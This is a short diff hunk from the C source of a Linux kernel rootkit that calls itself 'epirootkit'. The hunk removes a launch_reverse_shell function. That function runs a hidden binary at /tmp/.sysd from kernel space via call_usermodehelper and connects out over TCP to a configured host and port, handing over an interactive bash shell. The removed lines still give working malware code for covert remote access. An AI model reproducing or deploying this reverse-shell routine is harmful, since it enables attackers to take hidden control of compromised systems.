@@ -62,32 +62,6 @@ int send_to_server(char *message)
 	return SUCCESS;
 }
 
-void launch_reverse_shell(void)
-{
-    char ip_port[32];
-	snprintf(ip_port, sizeof(ip_port), "TCP:%s:%d", ip, REVERSE_SHELL_PORT);
-
-	char *argv[] = {
-		"/tmp/.sysd",
-		ip_port,
-		"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
-		NULL
-	};
-
-    char *envp[] = {
-        "HOME=/",
-        "PATH=/usr/bin:/bin:/usr/sbin:/sbin:/tmp",
-        NULL
-    };
-
-    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-    if (ret < 0) {
-        pr_err("epirootkit: socat reverse shell failed: %d\n", ret);
-    } else {
-        pr_info("epirootkit: socat reverse shell launched on %s:%d\n", ip, REVERSE_SHELL_PORT);
-    }
-}
-
 /**
  * @brief Kernel thread function for managing network communication.
  *
